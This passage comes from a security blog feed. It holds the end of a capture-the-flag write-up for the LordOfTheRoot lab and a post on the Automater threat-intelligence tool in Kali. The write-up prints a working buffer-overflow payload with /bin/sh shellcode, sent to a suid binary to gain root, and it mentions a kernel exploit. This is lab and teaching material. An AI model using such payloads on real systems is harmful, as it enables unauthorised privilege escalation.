</span><span class='line'>  /lib/ld-linux.so.2 (0x40000000)</span></code></pre></td></tr></table></div></figure>


<p>I tweaked the exploit again, but I still couldn&rsquo;t hit on a valid ESP address. In the end, I used Peda to help me locate a <em>jmp esp</em> address:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ jmpcall esp
</span><span class='line'>Not found
</span><span class='line'>gdb-peda$ jmpcall esp libc
</span><span class='line'>0x4003ea85 : jmp esp</span></code></pre></td></tr></table></div></figure>


<p>Adjusted the exploit again, and it worked:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ r $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
</span><span class='line'>Starting program: /tmp/file $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
</span><span class='line'>process 5184 is executing new program: /bin/dash
</span><span class='line'>$ whoami
</span><span class='line'>[New process 5187]
</span><span class='line'>process 5187 is executing new program: /usr/bin/whoami
</span><span class='line'>smeagol
</span><span class='line'>$ [Inferior 2 (process 5187) exited normally]
</span><span class='line'>Warning: not running or target is remote</span></code></pre></td></tr></table></div></figure>


<p>To gain root, we need to exploit the real suid binary:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:/SECRET/door2$ ./file $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
</span><span class='line'># whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<h2>Privilege escalation method #3 &ndash; kernel exploit</h2>

<p>Lastly, we&rsquo;re back to the <a href="https://www.exploit-db.com/exploits/39166">overlayfs exploit</a>. It&rsquo;s just a matter of download, compile, run:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:/tmp$ ./overlay 
</span><span class='line'>root@LordOfTheRoot:/tmp# whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>We owned Mordor! This was such an interesting challenge, learned many new things! Thanks to KookSec for this!</p>

<h4>Learn more</h4>

<ul>
<li><p><a href="https://www.exploit-db.com/papers/13030/">ASLR bypassing</a></p></li>
<li><p><a href="http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf">Linux Interactive Exploit Development with GDB and PEDA</a></p></li>
<li><p><a href="https://www.exploit-db.com/exploits/39669/">disable ASLR trick</a></p></li>
</ul>


<p>Will leave you with this:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/lordoftheroot/legolas.jpg" title="legolas" alt="legolas"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Automater - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/11/automater-kali-linux-tools/"/>
    <updated>2017-06-11T03:57:26-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/11/automater-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you want to check suspicious IPs, domains and hashes for maliciousness. Maybe you&rsquo;ve heard that your favorite news site has been hacked and is serving malware to its users. You&rsquo;d like to confirm if something is dangerous or not, without navigating to it and risking to get compromised in the process. There is a Python tool on Kali that can help you with just that! Enter Automater!</p>

<!-- more -->


<p>Homepage: <a href="http://www.tekdefense.com/automater/">http://www.tekdefense.com/automater/</a></p>

<p>If you want to get it on your distro, you can grab it from its <a href="https://github.com/1aN0rmus/TekDefense-Automater">Github repository</a></p>

<h1>Automater description</h1>

<blockquote><p>Automater is a URL/Domain, IP Address, and Md5 Hash OSINT tool aimed at making the analysis process easier for
intrusion Analysts. Given a target (URL, IP, or HASH) or a file full of targets Automater will return relevant
results from sources like the following: IPvoid.com, Robtex.com, Fortiguard.com, unshorten.me, Urlvoid.com,
Labs.alienvault.com, ThreatExpert, VxVault, and VirusTotal.</p></blockquote>

<h1>Automater options</h1>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>automater -h
</span><span class='line'>usage: Automater.py [-h] [-o OUTPUT] [-b] [-f CEF] [-w WEB] [-c CSV]
</span><span class='line'>                    [-d DELAY] [-s SOURCE] [--proxy PROXY] [-a USERAGENT] [-V]
</span><span class='line'>                    [-r] [-v]
</span><span class='line'>                    target
</span><span class='line'>
</span><span class='line'>IP, URL, and Hash Passive Analysis tool
</span><span class='line'>
</span><span class='line'>positional arguments:
</span><span class='line'>  target                List one IP Address (CIDR or dash notation accepted),
</span><span class='line'>                        URL or Hash to query or pass the filename of a file
</span><span class='line'>                        containing IP Address info, URL or Hash to query each
</span><span class='line'>                        separated by a newline.
</span><span class='line'>
</span><span class='line'>optional arguments:
</span><span class='line'>  -h, --help            show this help message and exit
</span><span class='line'>  -o OUTPUT, --output OUTPUT
</span><span class='line'>                        This option will output the results to a file.
</span><span class='line'>  -b, --bot             This option will output minimized results for a bot.
</span><span class='line'>  -f CEF, --cef CEF     This option will output the results to a CEF formatted
</span><span class='line'>                        file.
</span><span class='line'>  -w WEB, --web WEB     This option will output the results to an HTML file.
</span><span class='line'>  -c CSV, --csv CSV     This option will output the results to a CSV file.
</span><span class='line'>  -d DELAY, --delay DELAY
</span><span class='line'>                        This will change the delay to the inputted seconds.
</span><span class='line'>                        Default is 2.
</span><span class='line'>  -s SOURCE, --source SOURCE
</span><span class='line'>                        This option will only run the target against a
</span><span class='line'>                        specific source engine to pull associated domains.
</span><span class='line'>                        Options are defined in the name attribute of the site
</span><span class='line'>                        element in the XML configuration file. This can be a
</span><span class='line'>                        list of names separated by a semicolon.
</span><span class='line'>  --proxy PROXY         This option will set a proxy to use (eg.
</span><span class='line'>                        proxy.example.com:8080)
</span><span class='line'>  -a USERAGENT, --useragent USERAGENT
</span><span class='line'>                        This option allows the user to set the user-agent seen
</span><span class='line'>                        by web servers being utilized. By default, the user-
</span><span class='line'>                        agent is set to Automater/version
</span><span class='line'>  -V, --vercheck        This option checks and reports versioning for
</span><span class='line'>                        Automater. Checks each python module in the Automater
</span><span class='line'>                        scope. Default, (no -V) is False
</span><span class='line'>  -r, --refreshxml      This option refreshes the tekdefense.xml file from the
</span><span class='line'>                        remote GitHub site. Default (no -r) is False.
</span><span class='line'>  -v, --verbose         This option prints messages to the screen. Default (no
</span><span class='line'>                        -v) is False.</span></code></pre></td></tr></table></div></figure>


<p>You can see there are multiple output options for further processing, like CEF formatted file, CSV and HTML. Also, it&rsquo;s important to remember that tools usually come with their default user agents, and it might be beneficial to change this when you run it, and make it look like a real browser.</p>

<h1>Automater usage</h1>

<ul>
<li>check IP for malware</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>automater 185.62.190.110
</span><span class='line'>/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:845: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
</span><span class='line'>  InsecureRequestWarning)
</span><span class='line'>
</span><span class='line'>____________________     Results found for: 185.62.190.110     ____________________
</span><span class='line'>No results found in the RTex DNS
</span><span class='line'>No results found in the FNet URL
</span><span class='line'>[+] VT ASN: No results found
</span><span class='line'>[+] VT Country: ZZ
</span><span class='line'>[+] VT AS Owner: No results found
</span><span class='line'>[+] VT pDNS: ('2016-08-24 00:00:00', 'cl0.f-aws.com')
</span><span class='line'>[+] VT pDNS: ('2017-05-19 00:00:00', 'mail.attw.io')
</span><span class='line'>[+] VT pDNS: ('2016-06-05 00:00:00', 'weinne.net')
</span><span class='line'>[+] VT pDNS: ('2017-02-08 00:00:00', 'www[.]woodmann.com')
</span><span class='line'>[+] VT Malware: ('2017-06-02 10:46:35', 'ceeca0c7dc341fa57532470f2d7caaa427bf77e1e533b7ff3d9d8e245d6ea5fd')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_Corso_2009-2-4_20.20_Corso_7.02.34.rar', '2017-06-07 17:23:57')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Tools/Vbdec34.zip', '2017-06-04 23:44:26')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/tools/', '2017-06-02 11:41:58')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/tools/dongles/vdog104.zip', '2017-06-02 10:46:33')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/archives/bartpak7.rar', '2017-06-01 19:35:43')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/bin_de_decompiler_2009-7-18_22.55_de_decompiler_lite.zip|&gt;de_decompiler_lite.exe', '2017-06-01 14:57:19')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/index.php/Category:RCE_Tools', '2017-05-31 09:16:42')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/index.php/Category:SoftICE_Extensions', '2017-05-27 18:28:27')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/forum/attachment.php?s=d1dedc683453c119989330b5967a2dea&attachmentid=2311&d=1278836882', '2017-05-26 20:45:35')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/fravia/exe/cryptpad.exe', '2017-05-26 18:00:12')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_LordPE_2010-6-29_3.9_LordPE_1.41_Deluxe_b.zip', '2017-05-26 13:50:29')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/index.php/LordPE', '2017-05-26 13:42:00')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/tools/dongles/admon25.rar', '2017-05-25 05:51:39')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/bin_wintruder_2008-10-24_22.21_wintruder.zip', '2017-05-24 12:33:31')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_Echo_Mirage_2014-1-11_17.28_EchoMirage-3.1.rar', '2017-05-24 10:42:52')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Archives/Kgensrcs.zip', '2017-05-19 18:39:05')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/bin_zeroadd_2014-5-9_1.29_zeroadd.zip', '2017-05-16 08:33:15')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Unpackers/Arm201b1.zip', '2017-05-11 22:16:38')
</span><span class='line'>[+] VT Mal URLs: ("hxxp://www[.]woodmann.com/collaborative/knowledge/images/bin_stuxnet's_rootkit_(mrxnet)_into_c++_2011-2-6_13.54_mrxnet.rar", '2017-05-11 06:28:02')
</span><span class='line'>[+] VT Mal URLs: ("hxxp://www[.]woodmann.com/collaborative/knowledge/images/Bin_Stuxnet's_Rootkit_(MRxNet)_into_C++_2011-2-6_13.54_MRxNet.rar", '2017-05-10 11:56:48')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/', '2017-05-09 13:25:03')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Tools/Dongles/Edgehasp.zip', '2017-05-09 06:50:13')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/index.php/Kernel_Detective', '2017-05-07 23:49:45')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/BobSoft/Pages/Plugins/ImmDbg', '2017-05-02 19:47:49')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/index.php/AdmiralDebilitate', '2017-04-29 23:08:33')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Tutorials/Nolflex3.htm', '2017-04-21 23:28:28')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_ImpREC_2011-7-16_8.11_ImpREC_1.7e.rar', '2017-04-20 17:33:51')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/index.php/Detect_It_Easy', '2017-04-19 22:55:52')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/forum/attachment.php', '2017-04-19 21:13:35')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_IIDKing_2007-10-19_23.37_tf23.zip', '2017-04-18 10:44:44')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_RTA_2011-9-6_20.52_rta2b2.zip', '2017-04-13 08:16:56')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Tools/Dongles/Haspdll.zip', '2017-04-11 17:42:56')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools', '2017-04-10 16:46:49')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Unpackers/ArmStripper01b6.rar', '2017-04-10 04:09:19')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/index.php/Echo_Mirage', '2017-04-08 16:34:47')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://185.62.190.110/accessroot/arteam/site/download.php?view.331', '2017-04-05 05:34:20')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_Unpacker_PECompact_2014-1-15_15.34_Unpacker_PECompact.rar', '2017-04-02 21:39:34')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/forum/forum.php', '2017-03-24 13:36:54')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_Superkill_2009-6-4_22.16_Superkill-V1.0.zip', '2017-03-16 01:02:57')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Tools/Wm.zip', '2017-03-16 01:02:57')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Tools/Cdtools.zip', '2017-03-16 01:02:57')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/FLEXlm/Lmv8gen.zip', '2017-03-15 18:06:40')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/krobar/collections/tkc/06.zip', '2017-03-14 19:32:26')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Archives/Crackmes.zip', '2017-03-14 19:32:26')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/knowledge/images/bin_virut.a_malware_analysis_paper_2010-9-3_15.53_virut.a.rar', '2017-03-14 14:34:44')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/index.php', '2017-03-14 09:22:56')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/krobar/collections/stones.zip', '2017-03-11 00:34:59')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/fravia/sources/WINUSER.H', '2017-03-08 11:57:20')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/bin_chimprec_2008-6-24_13.59_chimprec.zip|&gt;chimprec.exe', '2017-03-08 11:15:11')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/', '2017-03-03 07:12:55')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/krobar/collections/id-site.zip', '2017-02-24 01:16:48')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/knowledge/images/Bin_Stuxnet&', '2017-02-15 15:19:26')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/BobSoft/Files/Other/PEiD-0.95-20081103.zip', '2017-02-15 00:46:58')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Tools/Miscarc.zip', '2017-02-09 14:37:08')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://cl0.f-aws.com/metin2sometimes/client/pack/icepack.mp3.lz', '2016-10-09 15:24:40')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://cl0.f-aws.com/metin2sometimes/client/pack/efect.txt.lz', '2016-10-09 15:24:40')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://cl0.f-aws.com/metin2sometimes/client/lib/__future__.pyc.lz', '2016-10-09 15:24:39')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://cl0.f-aws.com/metin2sometimes/client/miles/mssa3d.m3d.lz', '2016-10-09 15:24:39')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://cl0.f-aws.com/metin2sometimes/app/normalize.css', '2016-10-09 15:24:37')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://cl0.f-aws.com/metin2sometimes/client/bgm/xmas.mp3.lz', '2016-10-09 15:24:38')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://cl0.f-aws.com/metin2sometimes/client/devil.dll.lz', '2016-10-09 15:24:37')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://cl0.f-aws.com/metin2asgard/client/mark/10.tga.lz', '2016-09-27 17:36:49')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://cl0.f-aws.com/metin2asgard/client/mark/10_1.tga.lz', '2016-09-27 17:34:08')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://185.62.190.110/Deutsche-Bank/db/erfolg.html', '2016-03-07 08:56:47')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://185.62.190.110/Deutsche-Bank/db/db.php', '2016-02-29 13:36:45')
</span><span class='line'>[+] Blacklist from IPVoid: No results found
</span><span class='line'>[+] ISP from IPvoid: No results found
</span><span class='line'>[+] Country from IPVoid: No results found
</span><span class='line'>[+] Malc0de Date: No results found
</span><span class='line'>[+] Malc0de IP: No results found
</span><span class='line'>[+] Malc0de Country: No results found
</span><span class='line'>[+] Malc0de ASN: No results found
</span><span class='line'>[+] Malc0de ASN Name: No results found
</span><span class='line'>[+] Malc0de MD5: No results found
</span><span class='line'>[+] Reputation Authority Score: 50/100
</span><span class='line'>[+] FreeGeoIP Country Name: Netherlands
</span><span class='line'>[+] FreeGeoIP Region Name: No results found
</span><span class='line'>[+] FreeGeoIP City: No results found
</span><span class='line'>[+] FreeGeoIP Zipcode: No results found
</span><span class='line'>[+] FreeGeoIP Latitude: 52.3824
</span><span class='line'>[+] FreeGeoIP Longitude: 4.8995
</span><span class='line'>[+] SANS total target IPs seen: No results found
</span><span class='line'>[+] SANS total packets blocked: No results found
</span><span class='line'>[+] SANS last seen on: No results found
</span><span class='line'>[+] SANS first seen on: No results found
</span><span class='line'>No results found in the THIP
</span><span class='line'>No results found in the TekHP
</span><span class='line'>[+] ProjectHoneypot activity type: No results found
</span><span class='line'>[+] ProjectHoneypot first mail received: No results found
</span><span class='line'>[+] ProjectHoneypot last mail received: No results found
</span><span class='line'>[+] ProjectHoneypot total mails received: No results found
</span><span class='line'>[+] ProjectHoneypot spider first seen: No results found
</span><span class='line'>[+] ProjectHoneypot spider last seen: No results found
</span><span class='line'>[+] ProjectHoneypot spider sightings: No results found
</span><span class='line'>[+] ProjectHoneypot user-agent sightings: No results found
</span><span class='line'>[+] ProjectHoneypot first post on: No results found
</span><span class='line'>[+] ProjectHoneypot last post on: No results found
</span><span class='line'>[+] ProjectHoneypot form posts: No results found
</span><span class='line'>[+] ProjectHoneypot first rule break on: No results found
</span><span class='line'>[+] ProjectHoneypot last rule break on: No results found
</span><span class='line'>[+] ProjectHoneypot rule break sightings: No results found
</span><span class='line'>[+] ProjectHoneypot first dictionary attack on: No results found
</span><span class='line'>[+] ProjectHoneypot last dictionary attack on: No results found
</span><span class='line'>[+] ProjectHoneypot dictionary attack sightings: No results found
</span><span class='line'>[+] ProjectHoneypot harvester first seen: No results found
</span><span class='line'>[+] ProjectHoneypot harvester last seen: No results found
</span><span class='line'>[+] ProjectHoneypot harvester sightings: No results found
</span><span class='line'>[+] ProjectHoneypot harvester results: No results found</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve used the IP of the Woodmann reverse engineering community. From the output, you can see that it&rsquo;s clean, excepting some files flagged by VirusTotal, as would be expected from a place where executable samples are shared for RE :)</p>

<ul>
<li>check domain for malware</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>automater corefitness.info
</span><span class='line'>/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:845: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
</span><span class='line'>  InsecureRequestWarning)
</span><span class='line'>
</span><span class='line'>____________________     Results found for: corefitness.info     ____________________
</span><span class='line'>No results found in the FNet URL
</span><span class='line'>No results found in the Un Redirect
</span><span class='line'>[+] IP from URLVoid: 76.74.155.21
</span><span class='line'>[+] Blacklist from URLVoid: No results found
</span><span class='line'>[+] Domain Age from URLVoid: 2009-12-08 (8 years ago)
</span><span class='line'>[+] Geo Coordinates from URLVoid: 40.6888 / -74.0203
</span><span class='line'>[+] Country from URLVoid:  (US) United States
</span><span class='line'>[+] pDNS data from VirusTotal: ('2017-04-02', '107.180.51.40')
</span><span class='line'>[+] pDNS data from VirusTotal: ('2016-12-14', '76.74.155.21')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2017-06-10', 'hxxp://corefitness.info/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2017-06-09', 'hxxp://corefitness.info/b/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2017-06-07', 'hxxp://corefitness.info/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2017-04-04', 'hxxp://corefitness.info/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2017-03-16', 'hxxp://corefitness.info/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2017-03-08', 'hxxp://corefitness.info/workouts/men/arms/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2017-03-07', 'hxxp://corefitness.info/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2017-02-25', 'hxxp://corefitness.info/workouts/women/arms/')
